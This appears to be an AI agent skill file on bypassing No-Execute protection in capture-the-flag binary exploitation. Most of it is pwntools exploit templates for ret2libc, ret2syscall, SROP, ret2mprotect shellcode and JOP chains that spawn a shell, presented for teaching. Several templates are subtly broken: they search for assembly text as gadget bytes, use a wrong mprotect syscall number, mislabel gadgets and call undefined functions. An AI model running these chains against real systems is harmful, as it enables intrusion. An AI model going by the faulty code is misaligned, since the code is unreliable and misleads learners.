---
name: nx-protection-bypass
description: Use this skill whenever analyzing binary exploitation challenges involving No-Execute (NX) protection. Trigger when the user mentions NX, non-executable stack, code-reuse attacks, ROP chains, SROP, ret2libc, ret2mprotect, or any scenario where they need to bypass execute-disable protections. This skill covers detecting NX status, understanding the protection mechanism, and implementing bypass techniques including ROP, SROP, and permission-flipping attacks.
---

# No-Execute (NX) Protection and Bypasses

This skill helps you analyze and bypass No-Execute (NX) protection in binary exploitation challenges. NX prevents execution of code on the stack and heap, forcing attackers to use code-reuse techniques.

## When to Use This Skill

Use this skill when:
- You're analyzing a binary and need to check if NX is enabled
- You've found a buffer overflow but can't execute shellcode directly
- You need to understand what bypass options are available
- You're planning a ROP, SROP, or ret2libc attack
- You encounter NX-related errors during exploitation

## Quick Detection

First, determine if NX is enabled on your target binary:

```bash
# Using checksec (recommended)
checksec --file ./vuln

# Using readelf
readelf -W -l ./vuln | grep GNU_STACK
# Look for RW (no E flag) = NX enabled
# Look for RWE (has E flag) = NX disabled

# Using execstack (quick audit)
execstack -q ./vuln
# Prints "X" if stack is executable

# Runtime check
cat /proc/<pid>/maps | grep -E "\[stack\]"
# rw- = NX enabled, rwx = NX disabled
```

**Interpretation:**
- `NX enabled` or `RW` permissions = stack is non-executable (you need a bypass)
- `NX disabled` or `RWE` permissions = you can execute shellcode directly

## Bypass Strategy Selection

Choose your bypass technique based on what's available:

| Technique | When to Use | Requirements |
|-----------|-------------|--------------|
| **ROP** | Most common case | `ret` gadgets in binary/libc |
| **Ret2libc** | Binary imports `system`/`execve` | Known libc addresses |
| **Ret2syscall** | No libc imports | Syscall numbers, register control |
| **SROP** | Limited gadgets, single `syscall; ret` | Info leak for libc base |
| **Ret2mprotect** | Need to run shellcode | `mprotect` in libc, writable page |
| **JOP/COP** | CET/IBT hardened, no `ret` gadgets | `jmp [reg]` or `call [reg]` gadgets |

## Core Bypass Techniques

### 1. Return-Oriented Programming (ROP)

ROP chains reuse existing code snippets (gadgets) ending in `ret` to perform arbitrary operations without injecting executable code.

**Basic workflow:**
1. Find gadgets using `ropper` or `radare2`
2. Leak a libc/code address to resolve bases
3. Chain gadgets to set up registers
4. Call `system("/bin/sh")` or equivalent

**Example with pwntools:**
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Find gadgets
pop_rdi = next(elf.search(b'pop rdi; ret'))
ret2win = next(elf.search(b'pop rsi; ret'))

# Build chain
rop = ROP(elf)
rop.ret2win()
rop.ret2win()

# Or call libc functions
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
```

### 2. Ret2libc

When the binary imports `system` and `execve`, you can directly call them from libc.

**Requirements:**
- Binary must import `system` (check with `nm -D ./vuln | grep system`)
- Need libc base address (via info leak or hardcoded for local testing)

**Template:**
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Find addresses
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# Build payload
payload = flat([
    'A' * offset,  # Fill buffer to overwrite return address
    pop_rdi,       # pop rdi; ret
    binsh_addr,    # argument for system
    system_addr    # call system
])

sendline(payload)
```

### 3. Ret2syscall

When libc functions aren't available, use syscalls directly.

**Common syscalls:**
- `__NR_execve` (59 on x64, 11 on x86) - execute program
- `__NR_mprotect` (10 on x64, 125 on x86) - change memory permissions
- `__NR_rt_sigreturn` (15 on x64, 138 on x86) - for SROP

**Template for execve:**
```python
from pwn import *

# x64 syscall convention: rax=syscall_num, rdi=arg1, rsi=arg2, rdx=arg3
rax = 59  # __NR_execve
rdi = 0   # NULL (argv[0])
rsi = 0   # NULL (argv)
rdx = 0   # NULL (envp)

# Find gadgets to set registers
pop_rax = next(elf.search(b'pop rax; ret'))
pop_rdi = next(elf.search(b'pop rdi; ret'))
# ... etc

# Find syscall; ret gadget
syscall_ret = next(elf.search(b'\x0f\x05\xc3'))  # syscall; ret

payload = flat([
    pop_rax, rax,
    pop_rdi, rdi,
    pop_rsi, rsi,
    pop_rdx, rdx,
    syscall_ret
])
```

### 4. Sigreturn Oriented Programming (SROP)

SROP creates a fake signal frame and calls `sys_rt_sigreturn` to restore arbitrary register state.

**When to use:**
- Only one `syscall; ret` gadget available
- Need full register control
- Recent CTF challenges often feature this

**Basic concept:**
1. Build fake `sigframe` structure on writable memory
2. Set all registers to desired values in the frame
3. Call `sys_rt_sigreturn` (syscall 15 on x64)
4. Kernel "restores" your fake context

**Template:**
```python
from pwn import *

# Build fake sigframe
sigframe = SigreturnFrame(elf)
sigframe.rax = 0x1000  # mprotect
sigframe.rdi = 0x404000  # target address
sigframe.rsi = 0x1000  # size
sigframe.rdx = 7  # PROT_READ | PROT_WRITE | PROT_EXEC
sigframe.rip = 0x404000  # jump to shellcode after mprotect

# Find syscall; ret
syscall_ret = next(elf.search(b'\x0f\x05\xc3'))

payload = flat([
    'A' * offset,
    syscall_ret,
    bytes(sigframe)  # fake frame on stack
])
```

### 5. Ret2mprotect

Use `mprotect` to make a writable page executable, then run shellcode.

**Template:**
```python
from pwn import *
from pwn import shellcraft

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# Find mprotect in libc
mprotect_addr = libc.symbols['mprotect']

# Align address down to page boundary
bss_addr = elf.bss() & ~(0x1000 - 1)

# Build ROP chain
rop = ROP(libc)
rop.mprotect(bss_addr, 0x1000, 7)  # PROT_READ | WRITE | EXEC

# Payload: ROP chain + shellcode
payload = flat([
    'A' * offset,
    rop.chain(),
    asm(shellcraft.sh())  # shellcode
])

sendline(payload)
```

### 6. Jump/Call-Oriented Programming (JOP/COP)

When `ret` instructions are blocked (CET/IBT), use indirect jumps or calls.

**Gadget patterns to find:**
- `jmp [rax]` - jump to address in rax
- `call [rdi]` - call address in rdi
- `jmp [rdx + 0x10]` - jump to address in rdx + offset

**Template:**
```python
from pwn import *

# Find JOP gadgets
jmp_rax = next(elf.search(b'\xff\xe0'))  # jmp rax
jmp_rdi = next(elf.search(b'\xff\xe7'))  # jmp edi

# Build chain using indirect jumps
payload = flat([
    'A' * offset,
    jmp_rax,
    next_gadget_addr,
    # ... continue chain
])
```

## Common Pitfalls

1. **Address randomization (ASLR):** Always leak an address first to calculate libc base
2. **Stack alignment:** Some libc functions require 16-byte stack alignment
3. **Canaries:** Check for stack canaries with `checksec` and bypass them first
4. **PIE binaries:** If PIE is enabled, you need to leak the binary base too
5. **Gadget availability:** Not all binaries have useful gadgets - check with `ropper`

## Debugging Tips

```bash
# Run with GDB and pwndbg/gef
gdb ./vuln

# In GDB:
context  # Show registers, stack, etc.
pi pwn    # Access pwntools in GDB

# Check NX status in GDB
info proc mappings

# Trace execution
set follow-fork-mode child
run
```

## Related Skills

- **ROP chains:** See the ROP skill for detailed gadget finding and chain construction
- **Ret2libc:** See the ret2libc skill for libc function exploitation
- **SROP:** See the SROP skill for signal frame exploitation
- **Info leaks:** See the info-leak skill for address disclosure techniques

## References

- [CVE-2024-42067 - Linux kernel eBPF JIT vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2024-42067)
- [n00bzCTF 2023 - Hostel (SROP) writeup](https://ctftime.org/writeup/37315)
- [pwntools ROP documentation](https://docs.pwntools.com/en/stable/rop.html)
- [ROPgadget - find ROP gadgets](https://github.com/JonathanSalwan/ROPgadget)
